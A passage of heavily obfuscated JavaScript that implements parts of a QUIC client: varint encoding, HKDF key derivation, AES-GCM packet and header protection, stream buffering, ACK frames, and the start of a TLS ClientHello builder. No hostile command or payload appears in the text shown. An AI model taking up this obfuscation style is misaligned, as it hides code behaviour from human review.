        'initialMaxData': 0x4,
        'initialMaxStreamDataBidiLocal': 0x5,
        'initialMaxStreamDataBidiRemote': 0x6,
        'initialMaxStreamDataUni': 0x7,
        'initialMaxStreamsBidi': 0x8,
        'initialMaxStreamsUni': 0x9,
        'ackDelayExponent': 0xa,
        'maxAckDelay': 0xb,
        'disableActiveMigration': 0xc,
        'activeConnectionIdLimit': 0xe,
        'initialSourceConnectionId': 0xf,
        'retrySourceConnectionId': 0x10,
        'maxDatagramFrameSize': 0x20
    };
function a0bq(a) {
    const hh = a0ch, b = {
            'EzxFa': function (d, f) {
                return d(f);
            },
            'Yptyw': function (d, f) {
                return d < f;
            }
        }, c = b[hh(0x723)](BigInt, a);
    if (b['Yptyw'](c, 0x40n))
        return 0x1;
    if (c < 0x4000n)
        return 0x2;
    if (b[hh(0x55b)](c, 0x40000000n))
        return 0x4;
    return 0x8;
}
function a0br(a) {
    const hi = a0ch, b = {
            'Xladp': function (j, k) {
                return j(k);
            },
            'CWoar': function (j, k) {
                return j < k;
            },
            'vhsRY': function (j, k) {
                return j < k;
            },
            'OzkGN': function (j, k) {
                return j - k;
            },
            'wCWZs': function (j, k) {
                return j > k;
            },
            'febxZ': function (j, k) {
                return j & k;
            },
            'kFPyF': function (j, k) {
                return j | k;
            }
        }, c = b[hi(0xcf5)](BigInt, a);
    let d, f, g;
    if (b[hi(0x89c)](c, 0x40n))
        f = 0x1, g = 0x0;
    else {
        if (b[hi(0x89c)](c, 0x4000n))
            f = 0x2, g = 0x40;
        else
            b[hi(0x47e)](c, 0x40000000n) ? (f = 0x4, g = 0x80) : (f = 0x8, g = 0xc0);
    }
    d = Buffer[hi(0x9e7)](f);
    let h = c;
    for (let j = b[hi(0x3bf)](f, 0x1); b[hi(0x1ff)](j, 0x0); j--) {
        d[j] = b[hi(0xcf5)](Number, b[hi(0x321)](h, 0xffn)), h >>= 0x8n;
    }
    return d[0x0] = b[hi(0xadc)](Number(h), g), d;
}
function a0bs(a, b) {
    const hj = a0ch, c = {
            'qSFrU': function (h, j) {
                return h < j;
            },
            'fXgse': function (h, j) {
                return h - j;
            },
            'NzcQR': function (h, j) {
                return h << j;
            },
            'ZlMHy': function (h, j) {
                return h >> j;
            },
            'JAFNw': function (h, j) {
                return h < j;
            },
            'BVNIG': function (h, j) {
                return h - j;
            },
            'cFZJt': function (h, j) {
                return h(j);
            },
            'bPTKX': function (h, j) {
                return h & j;
            },
            'sHfJo': function (h, j) {
                return h << j;
            },
            'hwqiR': function (h, j) {
                return h + j;
            }
        };
    if (c[hj(0xb32)](c[hj(0x207)](a[hj(0xed)], b), 0x1))
        return null;
    const d = a[b], f = c['NzcQR'](0x1, c['ZlMHy'](d, 0x6));
    if (c[hj(0x546)](c[hj(0xd02)](a[hj(0xed)], b), f))
        return null;
    let g = c['cFZJt'](BigInt, c[hj(0xb27)](d, 0x3f));
    for (let h = 0x1; h < f; h++) {
        g = c[hj(0x758)](g, 0x8n) | BigInt(a[c[hj(0x864)](b, h)]);
    }
    return [
        g,
        f
    ];
}
class a0bt {
    constructor() {
        const hk = a0ch;
        this[hk(0x9e0)] = [];
    }
    [a0ch(0x4a0)](a) {
        const hl = a0ch, b = {
                'pAdzR': function (c, d) {
                    return c & d;
                }
            };
        return this['parts'][hl(0x77f)](Buffer[hl(0x8c2)]([b[hl(0x8e8)](a, 0xff)])), this;
    }
    [a0ch(0x717)](a) {
        const hm = a0ch;
        return this[hm(0x9e0)]['push'](Buffer[hm(0xabf)](a) ? a : Buffer[hm(0x8c2)](a)), this;
    }
    [a0ch(0xb9e)](a, b) {
        const hn = a0ch, c = {
                'NdJSA': function (f, g) {
                    return f - g;
                },
                'bZphM': function (f, g) {
                    return f >= g;
                },
                'YxRuO': function (f, g) {
                    return f(g);
                },
                'CThHz': function (f, g) {
                    return f & g;
                }
            }, d = Buffer['alloc'](b);
        for (let f = c[hn(0x200)](b, 0x1); c['bZphM'](f, 0x0); f--) {
            d[f] = c[hn(0x5e1)](Number, c[hn(0x93e)](a, 0xffn)), a >>= 0x8n;
        }
        return this[hn(0x9e0)][hn(0x77f)](d), this;
    }
    ['u8'](a) {
        const ho = a0ch;
        return this[ho(0x9e0)][ho(0x77f)](Buffer['from']([a & 0xff])), this;
    }
    ['u16'](a) {
        const hp = a0ch, b = Buffer[hp(0x9e7)](0x2);
        return b[hp(0xb21)](a & 0xffff, 0x0), this[hp(0x9e0)][hp(0x77f)](b), this;
    }
    [a0ch(0x629)](a) {
        const hq = a0ch, b = {
                'IwPZf': function (d, f) {
                    return d >>> f;
                }
            }, c = Buffer[hq(0x9e7)](0x4);
        return c['writeUInt32BE'](b[hq(0x2d8)](a, 0x0), 0x0), this[hq(0x9e0)][hq(0x77f)](c), this;
    }
    [a0ch(0x2d2)](a) {
        const hr = a0ch, b = {
                'dGIHo': function (c, d) {
                    return c(d);
                }
            };
        return this[hr(0x9e0)]['push'](b[hr(0x592)](a0br, a)), this;
    }
    [a0ch(0x14c)]() {
        const hs = a0ch;
        return Buffer[hs(0x653)](this[hs(0x9e0)]);
    }
}
class a0bu {
    constructor(a) {
        const ht = a0ch;
        this['buffer'] = a, this[ht(0x28d)] = 0x0;
    }
    get [a0ch(0x7b4)]() {
        const hu = a0ch;
        return this[hu(0xc5e)]['length'] - this[hu(0x28d)];
    }
    [a0ch(0x4a0)]() {
        const hv = a0ch, a = this[hv(0xc5e)][this[hv(0x28d)]];
        return this['pos'] += 0x1, a;
    }
    [a0ch(0x3c7)]() {
        const hw = a0ch, a = this[hw(0xc5e)]['readUInt16BE'](this['pos']);
        return this[hw(0x28d)] += 0x2, a;
    }
    [a0ch(0x8bb)]() {
        const hx = a0ch, a = this[hx(0xc5e)]['readUIntBE'](this[hx(0x28d)], 0x3);
        return this[hx(0x28d)] += 0x3, a;
    }
    [a0ch(0x629)]() {
        const hy = a0ch, a = this['buffer'][hy(0x236)](this[hy(0x28d)]);
        return this[hy(0x28d)] += 0x4, a;
    }
    ['bytes'](a) {
        const hz = a0ch, b = {
                'BNeeG': function (d, f) {
                    return d + f;
                }
            }, c = this[hz(0xc5e)][hz(0x4b4)](this[hz(0x28d)], b[hz(0x73a)](this['pos'], a));
        return this[hz(0x28d)] += a, c;
    }
    [a0ch(0x2d2)]() {
        const hA = a0ch, a = {
                'nBEiz': function (c, d) {
                    return c === d;
                },
                'KaZWY': hA(0x9b4)
            }, b = a0bs(this['buffer'], this[hA(0x28d)]);
        if (a[hA(0x436)](b, null))
            throw new Error(a[hA(0x1d5)]);
        return this[hA(0x28d)] += b[0x1], b[0x0];
    }
    [a0ch(0x62a)]() {
        const hB = a0ch, a = {
                'MOZhu': function (c, d) {
                    return c > d;
                },
                'lgqEU': function (c, d) {
                    return c(d);
                }
            }, b = this[hB(0x2d2)]();
        if (a[hB(0x53d)](b, a[hB(0xac7)](BigInt, Number[hB(0x693)])))
            return Number[hB(0x693)];
        return a[hB(0xac7)](Number, b);
    }
}
function a0bv(a, b, c) {
    const hC = a0ch;
    return a0k[hC(0xa37)](a, b)[hC(0xd44)](c)[hC(0x248)]();
}
function a0bw(a, b, c, d) {
    const hD = a0ch, f = {
            'nBccL': function (j, k) {
                return j < k;
            }
        }, g = [];
    let h = Buffer[hD(0x9e7)](0x0), i = 0x1;
    while (f['nBccL'](g[hD(0xb62)]((j, k) => j + k['length'], 0x0), d)) {
        h = a0k[hD(0xa37)](a, b)[hD(0xd44)](Buffer[hD(0x653)]([
            h,
            c,
            Buffer[hD(0x8c2)]([i])
        ]))[hD(0x248)](), g[hD(0x77f)](h), i++;
    }
    return Buffer[hD(0x653)](g)[hD(0x4b4)](0x0, d);
}
function a0bx(a, b, c, d, f) {
    const hE = a0ch, g = {
            'rwVPY': hE(0x273),
            'ksUHZ': hE(0xc74),
            'AsZVt': function (k, l) {
                return k & l;
            },
            'WEIbA': function (k, l) {
                return k >> l;
            }
        }, h = Buffer[hE(0x653)]([
            Buffer[hE(0x8c2)](g[hE(0xcf0)], g[hE(0x5f0)]),
            Buffer[hE(0x8c2)](c, g[hE(0x5f0)])
        ]), i = d || Buffer[hE(0x9e7)](0x0), j = Buffer[hE(0x653)]([
            Buffer[hE(0x8c2)]([
                g[hE(0x853)](g[hE(0x91e)](f, 0x8), 0xff),
                f & 0xff
            ]),
            Buffer[hE(0x8c2)]([h[hE(0xed)]]),
            h,
            Buffer[hE(0x8c2)]([i['length']]),
            i
        ]);
    return a0bw(a, b, j, f);
}
class a0by {
    constructor(a, b, c) {
        const hF = a0ch, d = {
                'XrnPr': function (g, h) {
                    return g === h;
                },
                'EERsF': hF(0x3c6),
                'mMGoT': function (g, h, i, j, k, l) {
                    return g(h, i, j, k, l);
                },
                'zNSbN': 'quic\x20iv',
                'tQEUI': hF(0x2c3),
                'atTQi': hF(0x740)
            };
        this['hash'] = a, this[hF(0x2fa)] = b, this[hF(0x2cd)] = c;
        const f = d[hF(0x4b5)](b, d[hF(0xb79)]) ? 0x20 : 0x10;
        this[hF(0x62f)] = d['mMGoT'](a0bx, a, c, 'quic\x20key', Buffer['alloc'](0x0), f), this['iv'] = d[hF(0x9c7)](a0bx, a, c, d[hF(0x4d2)], Buffer[hF(0x9e7)](0x0), 0xc), this['hpKey'] = a0bx(a, c, d[hF(0x566)], Buffer[hF(0x9e7)](0x0), f), this[hF(0x88e)] = d[hF(0x4b5)](f, 0x20) ? hF(0xb3a) : d[hF(0x767)], this[hF(0xaee)] = 0x10;
    }
    [a0ch(0x183)](a) {
        const hG = a0ch, b = {
                'KzoVR': function (f, g) {
                    return f < g;
                },
                'wsRPt': function (f, g) {
                    return f - g;
                },
                'vayIG': function (f, g) {
                    return f(g);
                }
            }, c = Buffer[hG(0x8c2)](this['iv']);
        let d = BigInt(a);
        for (let f = 0x0; b[hG(0x776)](f, 0x8); f++) {
            c[b['wsRPt'](0xb, f)] ^= b[hG(0x6ea)](Number, d & 0xffn), d >>= 0x8n;
        }
        return c;
    }
    [a0ch(0xb46)](a) {
        const hH = a0ch, b = a0k['createCipheriv'](this[hH(0x88e)], this[hH(0xbbf)], null);
        return b[hH(0xb6b)](![]), Buffer['concat']([
            b['update'](a),
            b[hH(0x531)]()
        ])[hH(0x4b4)](0x0, 0x5);
    }
    ['seal'](a, b, c) {
        const hI = a0ch, d = a0k[hI(0x31d)](this[hI(0x2fa)], this[hI(0x62f)], this['nonce'](a));
        d[hI(0x71e)](b);
        const f = Buffer[hI(0x653)]([
                d[hI(0xd44)](c),
                d[hI(0x531)]()
            ]), g = d[hI(0x927)]();
        return Buffer[hI(0x653)]([
            f,
            g
        ]);
    }
    ['open'](a, b, c) {
        const hJ = a0ch, d = {
                'TIerf': function (g, h) {
                    return g - h;
                }
            }, f = a0k[hJ(0x191)](this[hJ(0x2fa)], this[hJ(0x62f)], this['nonce'](a));
        return f['setAAD'](b), f[hJ(0x13e)](c[hJ(0x4b4)](d['TIerf'](c[hJ(0xed)], this['tagSize']))), Buffer[hJ(0x653)]([
            f[hJ(0xd44)](c['subarray'](0x0, c[hJ(0xed)] - this['tagSize'])),
            f[hJ(0x531)]()
        ]);
    }
}
function a0bz(a, b) {
    const hK = a0ch, c = new a0by(a[hK(0x977)], a['cipher'], a0bx(a['hash'], a[hK(0x2cd)], hK(0x39b), Buffer[hK(0x9e7)](0x0), a[hK(0x2cd)][hK(0xed)]));
    return b && (c['hpKey'] = a[hK(0xbbf)]), c;
}
function a0bA(a, b) {
    const hL = a0ch, c = {
            'NErqB': function (i, j, k, l) {
                return i(j, k, l);
            },
            'LXkmd': hL(0xd0e),
            'beOSe': 'aes-128-gcm',
            'mLEKM': function (i, j, k, l, m, n) {
                return i(j, k, l, m, n);
            }
        }, d = hL(0xb11), f = c[hL(0x32a)](a0bv, d, a0be, a), g = b ? 'client\x20in' : c[hL(0x6cd)], h = b ? 'server\x20in' : hL(0x15c);
    return {
        'send': new a0by(d, c[hL(0x743)], a0bx(d, f, g, Buffer[hL(0x9e7)](0x0), 0x20)),
        'recv': new a0by(d, c[hL(0x743)], c['mLEKM'](a0bx, d, f, h, Buffer[hL(0x9e7)](0x0), 0x20))
    };
}
function a0bB(a, b, c) {
    const hM = a0ch, d = {
            'FhaJa': function (g, h) {
                return g <= h;
            },
            'XUKPx': function (g, h) {
                return g >= h;
            },
            'gmzTp': function (g, h) {
                return g < h;
            },
            'aSQVr': function (g, h) {
                return g - h;
            },
            'XFzbg': function (g, h) {
                return g > h;
            },
            'TOmXb': function (g, h) {
                return g - h;
            }
        }, f = [];
    for (const g of a) {
        const h = g[hM(0xd0b)], i = g[hM(0xd0b)] + g['length'];
        if (d[hM(0x404)](i, b) || d['XUKPx'](h, c)) {
            f[hM(0x77f)](g);
            continue;
        }
        d[hM(0xb1a)](h, b) && f[hM(0x77f)]({
            'start': h,
            'length': d[hM(0xc23)](b, h)
        }), d[hM(0x625)](i, c) && f['push']({
            'start': c,
            'length': d[hM(0xc8d)](i, c)
        });
    }
    return f;
}
function a0bC(c, d) {
    const hN = a0ch, f = {
            'kmUah': function (i, j) {
                return i - j;
            },
            'cTTPC': function (i, j) {
                return i <= j;
            },
            'CnwGZ': function (i, j) {
                return i + j;
            },
            'aPElq': function (i, j) {
                return i - j;
            }
        }, g = c['concat'](d)[hN(0x9bd)]((i, j) => i[hN(0xd0b)] - j[hN(0xd0b)]), h = [];
    for (const i of g) {
        const j = h[hN(0xed)] ? h[f[hN(0x346)](h[hN(0xed)], 0x1)] : null, k = i[hN(0xd0b)] + i[hN(0xed)];
        j && f['cTTPC'](i['start'], f['CnwGZ'](j[hN(0xd0b)], j['length'])) ? j[hN(0xed)] = Math[hN(0x434)](j[hN(0xed)], f[hN(0x272)](k, j[hN(0xd0b)])) : h['push']({
            'start': i[hN(0xd0b)],
            'length': i[hN(0xed)]
        });
    }
    return h;
}
class a0bD {
    constructor(a) {
        const hO = a0ch, b = hO(0xbbb)[hO(0xbb0)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this[hO(0xa99)] = 0x0;
                continue;
            case '1':
                this[hO(0x649)] = Buffer[hO(0x9e7)](0x0);
                continue;
            case '2':
                this['pending'] = [];
                continue;
            case '3':
                this['fin'] = ![];
                continue;
            case '4':
                this[hO(0xced)] = [];
                continue;
            case '5':
                this[hO(0x205)] = a;
                continue;
            case '6':
                this['finUnacked'] = ![];
                continue;
            }
            break;
        }
    }
    get ['sentEnd']() {
        const hP = a0ch;
        return this['data'][hP(0xed)];
    }
    ['append'](a, b) {
        const hQ = a0ch;
        a[hQ(0xed)] && (this[hQ(0x649)] = Buffer[hQ(0x653)]([
            this['data'],
            a
        ]), this[hQ(0x19b)][hQ(0x77f)]({
            'start': this[hQ(0x649)]['length'] - a[hQ(0xed)],
            'length': a['length']
        })), b && (this[hQ(0x1d6)] = !![], this[hQ(0xa44)] = !![]);
    }
    [a0ch(0x9d8)](a) {
        const hR = a0ch, b = {
                'shJHa': function (g, h) {
                    return g + h;
                },
                'wGtzO': function (g, h) {
                    return g < h;
                },
                'pdnPD': function (g, h, i) {
                    return g(h, i);
                }
            };
        if (!this[hR(0x19b)][hR(0xed)] || a <= 0x0)
            return null;
        const c = this[hR(0x19b)][0x0], d = Math[hR(0x2dc)](c[hR(0xed)], a), f = {
                'start': c[hR(0xd0b)],
                'length': d
            };
        return c[hR(0xd0b)] += d, c[hR(0xed)] -= d, !c[hR(0xed)] && this[hR(0x19b)]['shift'](), f['bytes'] = this[hR(0x649)][hR(0x4b4)](f[hR(0xd0b)], b[hR(0x542)](f[hR(0xd0b)], d)), f[hR(0xd4f)] = b[hR(0x8fe)](f['start'], this[hR(0xa99)]), this[hR(0xa99)] = Math[hR(0x434)](this['frontier'], f[hR(0xd0b)] + d), this[hR(0xced)] = b[hR(0x10d)](a0bC, this['unacked'], [{
                'start': f[hR(0xd0b)],
                'length': d
            }]), f;
    }
    [a0ch(0x802)]() {
        const hS = a0ch;
        if (!this[hS(0x1d6)] || !this[hS(0xa44)] || this[hS(0x19b)]['length'] || this[hS(0xced)][hS(0xed)])
            return ![];
        return this[hS(0xa44)] = ![], !![];
    }
    [a0ch(0xbc2)](a, b, c) {
        const hT = a0ch, d = {
                'CeQii': function (f, g, h, i) {
                    return f(g, h, i);
                },
                'rcICh': function (f, g) {
                    return f + g;
                },
                'aEPoT': function (f, g) {
                    return f >= g;
                },
                'LmcLf': function (f, g) {
                    return f + g;
                }
            };
        this[hT(0xced)] = d['CeQii'](a0bB, this[hT(0xced)], a, d['rcICh'](a, b)), c && this[hT(0x1d6)] && d[hT(0xbaf)](d['LmcLf'](a, b), this[hT(0x649)][hT(0xed)]) && (this[hT(0xa44)] = ![]), this[hT(0x205)][hT(0xa1f)]();
    }
    [a0ch(0xba6)]() {
        const hU = a0ch, a = {
                'zLcmI': function (b, c, d) {
                    return b(c, d);
                }
            };
        this[hU(0xced)]['length'] && (this[hU(0xa99)] = this[hU(0xced)][0x0][hU(0xd0b)], this[hU(0x19b)] = a[hU(0x376)](a0bC, this[hU(0x19b)], this[hU(0xced)])['sort']((c, d) => c[hU(0xd0b)] - d[hU(0xd0b)]), this[hU(0xced)] = []), this['fin'] && (this[hU(0xa44)] = !![]);
    }
    [a0ch(0x67e)](a) {
        const hV = a0ch, b = {
                'ZmmLM': function (c, d, f, g) {
                    return c(d, f, g);
                },
                'NqZCC': function (c, d) {
                    return c + d;
                }
            };
        for (const c of a) {
            if (!c[hV(0xed)]) {
                c[hV(0x1d6)] && this[hV(0x1d6)] && (this[hV(0xa44)] = !![]);
                continue;
            }
            this[hV(0xced)] = b[hV(0x4e1)](a0bB, this[hV(0xced)], c[hV(0xd0b)], b[hV(0x596)](c[hV(0xd0b)], c[hV(0xed)])), this[hV(0x19b)] = a0bC(this[hV(0x19b)], [{
                    'start': c[hV(0xd0b)],
                    'length': c[hV(0xed)]
                }])[hV(0x9bd)]((d, f) => d[hV(0xd0b)] - f['start']);
        }
    }
    [a0ch(0x186)]() {
        const hW = a0ch;
        return !this[hW(0x19b)][hW(0xed)] && !this[hW(0xced)][hW(0xed)] && !this['finUnacked'];
    }
}
class a0bE {
    constructor() {
        const hX = a0ch;
        this[hX(0x21b)] = 0x0, this[hX(0x19b)] = [];
    }
    [a0ch(0x501)](a, b) {
        const hY = a0ch, c = {
                'KOYYb': function (f, g) {
                    return f > g;
                },
                'KQEWo': function (f, g) {
                    return f + g;
                },
                'pdcCQ': function (f, g) {
                    return f - g;
                },
                'jHWZU': function (f, g) {
                    return f !== g;
                },
                'iumQz': function (f, g) {
                    return f < g;
                },
                'xAhLo': function (f, g) {
                    return f === g;
                }
            };
        if (c[hY(0x9d0)](a, c[hY(0xb4c)](this[hY(0x21b)], 0x100000)))
            return Buffer[hY(0x9e7)](0x0);
        if (a < this[hY(0x21b)]) {
            const f = c[hY(0x10f)](this[hY(0x21b)], a);
            if (f >= b[hY(0xed)])
                return Buffer[hY(0x9e7)](0x0);
            b = b['subarray'](f), a = this[hY(0x21b)];
        }
        if (!b[hY(0xed)])
            return Buffer['alloc'](0x0);
        if (c[hY(0x873)](a, this[hY(0x21b)]))
            return this['pending'][hY(0x77f)]({
                'start': a,
                'bytes': Buffer[hY(0x8c2)](b)
            }), Buffer[hY(0x9e7)](0x0);
        const d = [b];
        this['contiguous'] += b[hY(0xed)];
        for (let g = !![]; g;) {
            g = ![];
            for (let h = 0x0; c['iumQz'](h, this['pending'][hY(0xed)]); h++) {
                if (c[hY(0x810)](this[hY(0x19b)][h][hY(0xd0b)], this[hY(0x21b)])) {
                    d[hY(0x77f)](this[hY(0x19b)][h][hY(0x717)]), this[hY(0x21b)] += this[hY(0x19b)][h]['bytes'][hY(0xed)], this[hY(0x19b)]['splice'](h, 0x1), g = !![];
                    break;
                }
            }
        }
        return Buffer[hY(0x653)](d);
    }
}
function a0bF(a, b, c, d) {
    const hZ = a0ch, f = {
            'eAjJk': function (j, k) {
                return j < k;
            },
            'xVNhP': function (j, k) {
                return j + k;
            },
            'TovXf': function (j, k) {
                return j + k;
            },
            'yXnbs': function (j, k) {
                return j & k;
            }
        };
    if (f[hZ(0x61c)](b[hZ(0xed)], c + 0x4 + a0bg))
        return null;
    const g = a[hZ(0xb46)](b[hZ(0x4b4)](f[hZ(0x547)](c, 0x4), f[hZ(0xafb)](c + 0x4, a0bg))), h = Buffer[hZ(0x8c2)](b);
    h[0x0] ^= f[hZ(0x135)](g[0x0], d ? 0xf : 0x1f);
    for (let j = 0x0; j < a0bh; j++) {
        h[f[hZ(0xafb)](c, j)] ^= g[f[hZ(0xafb)](0x1, j)];
    }
    return h;
}
function a0bG(a, b, c, d) {
    const i0 = a0ch, f = {
            'JAWYT': function (l, m) {
                return l + m;
            },
            'tnEqE': function (l, m) {
                return l & m;
            },
            'ltsZA': function (l, m) {
                return l < m;
            },
            'XBhNM': function (l, m) {
                return l < m;
            },
            'CjYqs': function (l, m) {
                return l + m;
            },
            'zTryy': function (l, m) {
                return l + m;
            }
        };
    if (b[i0(0xed)] < f['JAWYT'](f['JAWYT'](c, 0x4), a0bg))
        return null;
    const g = a[i0(0xb46)](b['subarray'](f['JAWYT'](c, 0x4), f[i0(0x6b6)](f[i0(0x6b6)](c, 0x4), a0bg))), h = Buffer[i0(0x8c2)](b);
    h[0x0] ^= f[i0(0x9b3)](g[0x0], d ? 0xf : 0x1f);
    const j = (h[0x0] & 0x3) + 0x1;
    for (let l = 0x0; f[i0(0x5ab)](l, j); l++) {
        h[f['JAWYT'](c, l)] ^= g[f[i0(0x6b6)](0x1, l)];
    }
    let k = 0x0;
    for (let m = 0x0; f[i0(0x131)](m, j); m++) {
        k = k * 0x100 + h[f[i0(0x3f5)](c, m)];
    }
    return [
        h[i0(0x4b4)](0x0, f['zTryy'](c, j)),
        k
    ];
}
function a0bH(a, b, c) {
    const i1 = a0ch, d = {
            'CjYkF': function (j, k) {
                return j + k;
            },
            'UqLQt': function (j, k) {
                return j - k;
            },
            'dsXeS': function (j, k) {
                return j << k;
            },
            'OrWKK': function (j, k) {
                return j | k;
            },
            'zbmVS': function (j, k) {
                return j(k);
            },
            'bdpYJ': function (j, k) {
                return j - k;
            },
            'QYazC': function (j, k) {
                return j <= k;
            },
            'kGepv': function (j, k) {
                return j << k;
            },
            'YvqHQ': function (j, k) {
                return j(k);
            },
            'GgcXk': function (j, k) {
                return j > k;
            },
            'yiUCn': function (j, k) {
                return j + k;
            },
            'ZWBCz': function (j, k) {
                return j >= k;
            },
            'KwVGz': function (j, k) {
                return j << k;
            }
        }, f = d[i1(0x9e8)](BigInt(a), 0x1n), g = d[i1(0x130)](d[i1(0xd17)](0x1n, BigInt(b)), 0x1n);
    let h = d['OrWKK'](f & ~g, d[i1(0x7f6)](BigInt, c));
    const i = d[i1(0xd17)](0x1n, d[i1(0x7f6)](BigInt, d[i1(0x113)](b, 0x1)));
    if (d[i1(0xab5)](h + i, f))
        h += d['kGepv'](0x1n, d[i1(0x33e)](BigInt, b));
    else
        d[i1(0x381)](h, d[i1(0x9ff)](f, i)) && d[i1(0x6f0)](h, d[i1(0xd17)](0x1n, BigInt(b))) && (h -= d['KwVGz'](0x1n, BigInt(b)));
    return d[i1(0x7f6)](Number, h);
}
function a0bI(a) {
    const i2 = a0ch, b = {
            'CkAtk': function (j, k) {
                return j - k;
            },
            'zzdSa': function (j, k) {
                return j >= k;
            },
            'yhduS': function (j, k) {
                return j - k;
            }
        }, c = new a0bt();
    c[i2(0x4a0)](a0bo[i2(0xbc2)]);
    const d = a['slice']()[i2(0x9bd)]((j, k) => j[i2(0xd0b)] - k[i2(0xd0b)]), f = d[b[i2(0x630)](d[i2(0xed)], 0x1)], g = b['CkAtk'](f[i2(0xd0b)] + f[i2(0xed)], 0x1);
    c['varint'](g), c['varint'](0x0), c[i2(0x2d2)](d[i2(0xed)] - 0x1), c[i2(0x2d2)](b['CkAtk'](g, f['start']));
    let h = f['start'];
    for (let j = d[i2(0xed)] - 0x2; b[i2(0x39a)](j, 0x0); j--) {
        const k = d[j], l = k[i2(0xd0b)] + k[i2(0xed)] - 0x1;
        c[i2(0x2d2)](b[i2(0x228)](h - l, 0x2)), c[i2(0x2d2)](l - k[i2(0xd0b)]), h = k[i2(0xd0b)];
    }
    return c[i2(0x14c)]();
}
function a0bJ(a) {
    const i3 = a0ch, b = {
            'MOjxg': function (k, l) {
                return k - l;
            },
            'UtGRW': function (k, l) {
                return k + l;
            },
            'wpNSb': function (k, l) {
                return k < l;
            },
            'JqeBa': function (k, l) {
                return k - l;
            },
            'lhmGf': function (k, l) {
                return k - l;
            },
            'bPuDx': function (k, l) {
                return k - l;
            },
            'jOZgg': function (k, l) {
                return k / l;
            }
        }, c = a[i3(0x62a)](), d = a[i3(0x62a)](), f = a[i3(0x62a)](), g = a['number'](), h = [{
                'start': b[i3(0x58d)](c, g),
                'length': b[i3(0xaf5)](g, 0x1)
            }];
    let j = c - g;
    for (let k = 0x0; b[i3(0xc9c)](k, f); k++) {
        const l = a[i3(0x62a)](), m = a[i3(0x62a)](), n = b[i3(0x8d2)](b[i3(0x68d)](j, l), 0x2);
        h[i3(0x77f)]({
            'start': b[i3(0x8d2)](n, m),
            'length': b[i3(0xaf5)](m, 0x1)
        }), j = b[i3(0x8a5)](n, m);
    }
    return h[i3(0x6d4)] = b[i3(0x8ad)](d, 0x3e8), h;
}
function a0bK(a) {
    const i4 = a0ch, b = {
            'VDNlV': function (f, g) {
                return f > g;
            },
            'EDLXK': function (f, g) {
                return f(g);
            },
            'TawGX': function (f, g) {
                return f < g;
            },
            'NBOoK': function (f, g) {
                return f === g;
            },
            'liDfl': function (f, g) {
                return f === g;
            },
            'RZJjX': function (f, g) {
                return f * g;
            }
        }, c = {}, d = new a0bu(a);
    while (b[i4(0x250)](d['remaining'], 0x0)) {
        const f = b[i4(0x8b9)](Number, d[i4(0x2d2)]()), g = d['number']();
        if (b[i4(0xb02)](d[i4(0x7b4)], g))
            break;
        const h = d[i4(0x717)](g);
        if (b[i4(0x221)](h[i4(0xed)], 0x1) || b[i4(0xca1)](h[i4(0xed)], 0x2) || b[i4(0x221)](h[i4(0xed)], 0x4) || h['length'] === 0x8) {
            let i = 0x0;
            for (const j of h) {
                i = b['RZJjX'](i, 0x100) + j;
            }
            c[f] = i;
        } else
            c[f] = Buffer[i4(0x8c2)](h);
    }
    return c;
}
function a0bL(a) {
    const i5 = a0ch, b = {
            'HWiEM': function (d, f) {
                return d === f;
            }
        }, c = new a0bt();
    for (const [d, f] of a) {
        let g;
        if (Buffer['isBuffer'](f))
            g = f;
        else
            b[i5(0x217)](f, !![]) ? g = Buffer[i5(0x9e7)](0x0) : g = a0br(f);
        c[i5(0x2d2)](d), c[i5(0x2d2)](g[i5(0xed)]), c[i5(0x717)](g);
    }
    return c[i5(0x14c)]();
}
function a0bM(a, b) {
    const i6 = a0ch, c = Buffer[i6(0x9e7)](0x4);
    return c[0x0] = a, c[i6(0x96b)](b[i6(0xed)], 0x1, 0x3), Buffer[i6(0x653)]([
        c,
        b
    ]);
}
function a0bN(a, b) {
    const i7 = a0ch, c = Buffer['alloc'](0x4);
    return c['writeUInt16BE'](a, 0x0), c[i7(0xb21)](b[i7(0xed)], 0x2), Buffer[i7(0x653)]([
        c,
        b
    ]);
}
class a0bO {
    constructor(a, b, c) {
        const i8 = a0ch, d = {
                'ibUNp': i8(0x96c),
                'JelBl': 'der',
                'sNtWr': 'sha256',
                'aSOgA': i8(0x255),
                'cIHEe': 'start'
            };
        this['serverName'] = a, this[i8(0x71b)] = b, this[i8(0xd5e)] = c, this[i8(0x4a7)] = a0k[i8(0xa0e)](i8(0xc93)), this[i8(0xc7d)] = this[i8(0x4a7)][i8(0xc7d)]['export']({
            'type': d[i8(0x8b4)],
            'format': d['JelBl']
        })[i8(0x4b4)](-0x20), this[i8(0x977)] = d[i8(0x28a)], this[i8(0x9c9)] = 0x20, this['cipher'] = d[i8(0x60a)], this[i8(0x6df)] = [], this[i8(0x22b)] = d['cIHEe'], this[i8(0xa0d)] = null, this[i8(0x3c9)] = null, this[i8(0xd20)] = null;
    }
    [a0ch(0x57c)](a) {
        const i9 = a0ch, b = {
                'XKbGf': function (f, g) {
                    return f === g;
                }
            }, c = a0k[i9(0xaf4)](this['hash']), d = b[i9(0x858)](a, undefined) ? this[i9(0x6df)] : this[i9(0x6df)][i9(0x88a)](0x0, a);
        for (const f of d) {
            c['update'](f);
        }
        return c[i9(0x248)]();
    }
    ['buildClientHello']() {
        const ia = a0ch, a = {
                'uCmMC': ia(0xc74),
                'QRtFO': function (p, q) {
                    return p + q;
                },
                'wFOEH': function (p, q, r) {
                    return p(q, r);
                },
                'tsOeL': function (p, q, r) {
                    return p(q, r);
                },
                'JQSbb': function (p, q) {
                    return p & q;
                },
                'QahBH': function (p, q) {
                    return p >> q;
                },
                'NhpDJ': function (p, q) {
                    return p & q;
                },
                'CrQPn': ia(0x17b)
